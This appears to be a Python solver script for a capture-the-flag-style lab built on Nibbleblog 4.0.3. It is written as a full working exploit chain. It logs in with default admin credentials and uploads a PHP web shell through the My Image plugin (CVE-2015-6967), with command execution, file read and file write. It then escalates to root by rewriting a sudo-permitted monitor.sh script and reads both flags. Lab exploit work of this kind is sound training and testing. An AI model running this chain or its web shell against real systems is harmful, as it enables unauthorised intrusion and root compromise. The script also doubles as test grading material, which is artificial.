#!/usr/bin/env python3
"""Independent HTTP attacker for the authentic Nibbleblog 4.0.3 chain."""
import http.cookiejar
import os
import socket
import urllib.parse
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://nibbles-target").rstrip("/")
EXPECTED_USER_FLAG = os.environ["EXPECTED_USER_FLAG"]
EXPECTED_ROOT_FLAG = os.environ["EXPECTED_ROOT_FLAG"]

client = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
)


def req(path, data=None, content_type=None):
    request = urllib.request.Request(BASE + path, data=data)
    if content_type:
        request.add_header("Content-Type", content_type)
    with client.open(request, timeout=12) as response:
        return response.status, response.read().decode("utf-8", errors="replace")


def run_php(command):
    query = urllib.parse.urlencode({"cmd": command})
    status, output = req(
        "/nibbleblog/content/private/plugins/my_image/image.php?" + query
    )
    assert status == 200
    return output


def write_monitor(content):
    query = urllib.parse.urlencode({"write": content})
    status, output = req(
        "/nibbleblog/content/private/plugins/my_image/image.php?" + query
    )
    assert status == 200 and "WRITTEN:" in output, output
    return output


def read_monitor():
    query = urllib.parse.urlencode({"read": "1"})
    status, output = req(
        "/nibbleblog/content/private/plugins/my_image/image.php?" + query
    )
    assert status == 200
    return output


host = urllib.parse.urlsplit(BASE).hostname
with socket.create_connection((host, 22), timeout=5) as sock:
    banner = sock.recv(180)
    assert banner.startswith(b"SSH-2.0-"), f"Expected native SSH, got {banner[:80]!r}"

status, home = req("/")
assert status == 200 and "Hello world!" in home
assert "<!-- /nibbleblog/ -->" in home
assert "my_image" not in home and "upload" not in home.lower()

status, readme = req("/nibbleblog/README")
assert status == 200 and "Version: v4.0.3" in readme
status, config = req("/nibbleblog/content/private/config.xml")
assert status == 200 and "Nibbles" in config
status, users = req("/nibbleblog/content/private/users.xml")
assert status == 200 and "admin" in users
status, login = req("/nibbleblog/admin.php")
assert status == 200 and "Nibbleblog" in login

status, dashboard = req(
    "/nibbleblog/admin.php?controller=user&action=login",
    urllib.parse.urlencode({"username": "admin", "password": "nibbles"}).encode(),
    "application/x-www-form-urlencoded",
)
assert "Nibbleblog security error" not in dashboard
status, dashboard = req("/nibbleblog/admin.php?controller=dashboard&action=view")
assert status == 200 and "Nibbleblog security error" not in dashboard
status, install = req(
    "/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image"
)
assert "Nibbleblog security error" not in install
print("PASS: recon, authentic Nibbleblog 4.0.3 login and native My Image plugin setup", flush=True)

# The upstream My Image controller uses move_uploaded_file() and does not
# restrict executable extensions. The uploaded PHP is the actual foothold.
boundary = "----nibbles-independent-player-boundary"
payload = (
    b'<?php '
    b'if (isset($_GET["write"])) { $n = file_put_contents("/home/nibbler/personal/stuff/monitor.sh", $_GET["write"]); echo $n === false ? "WRITE_FAILED" : "WRITTEN:" . $n; } '
    b'elseif (isset($_GET["read"])) { echo file_get_contents("/home/nibbler/personal/stuff/monitor.sh"); } '
    b'elseif (isset($_GET["cmd"])) { passthru($_GET["cmd"]); } '
    b'else { echo "NIBBLES_REAL_UPLOAD_EXEC"; } '
    b'?>'
)


def part(name, value, filename=None, mime=None):
    header = f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\""
    if filename is not None:
        header += f"; filename=\"{filename}\""
    header += "\r\n"
    if mime:
        header += f"Content-Type: {mime}\r\n"
    return header.encode() + b"\r\n" + value + b"\r\n"


body = part("plugin", b"my_image")
body += part("image", payload, "proof.php", "application/octet-stream")
body += f"--{boundary}--\r\n".encode()
status, result = req(
    "/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image",
    body,
    f"multipart/form-data; boundary={boundary}",
)
assert status == 200 and "Nibbleblog security error" not in result
proof = run_php("id -un; id -u")
assert "nibbler" in proof and "1001" in proof, proof
user_flag = run_php("cat /home/nibbler/user.txt").strip()
assert user_flag == EXPECTED_USER_FLAG, "Exact per-instance User Flag mismatch"
print("PASS: real CVE-2015-6967 plugin upload executes PHP as nibbler and retrieves User Flag", flush=True)

# Verify that the web account cannot read Root before the sudo transition.
assert run_php("test -r /root/root.txt; echo $?").strip() == "1"

# Recover the genuine archive, inspect the actual sudo rule, then modify the
# user-owned monitor script that the real sudoers entry permits.
output = run_php(
    "cd /home/nibbler && unzip -oq personal.zip && "
    "test -w personal/stuff/monitor.sh && sudo -n -l"
)
assert "monitor.sh" in output and "NOPASSWD" in output, output

root_lines = [
    "/usr/bin/id > /tmp/nibbles-native-root-proof",
    "/bin/chmod 0644 /tmp/nibbles-native-root-proof",
    "/bin/cat /root/root.txt > /tmp/nibbles-native-root-answer",
    "/bin/chmod 0644 /tmp/nibbles-native-root-answer",
]
write_monitor("#!/bin/sh\n" + "\n".join(root_lines) + "\n")
monitor_content = read_monitor()
assert all(line in monitor_content for line in root_lines), monitor_content
root_output = run_php(
    "sudo -n /home/nibbler/personal/stuff/monitor.sh 2>&1; "
    "echo SUDO_STATUS:$?; "
    "echo ROOT_PROOF; cat /tmp/nibbles-native-root-proof 2>&1; "
    "echo ROOT_ANSWER; cat /tmp/nibbles-native-root-answer 2>&1"
)
assert "uid=0(root)" in root_output, root_output
root_flag = root_output.split("ROOT_ANSWER", 1)[1].strip().splitlines()[-1]
assert root_flag == EXPECTED_ROOT_FLAG, "Exact per-instance Root Flag mismatch"
print("PASS: writable sudo monitor script executes as UID 0 and retrieves exact Root Flag", flush=True)
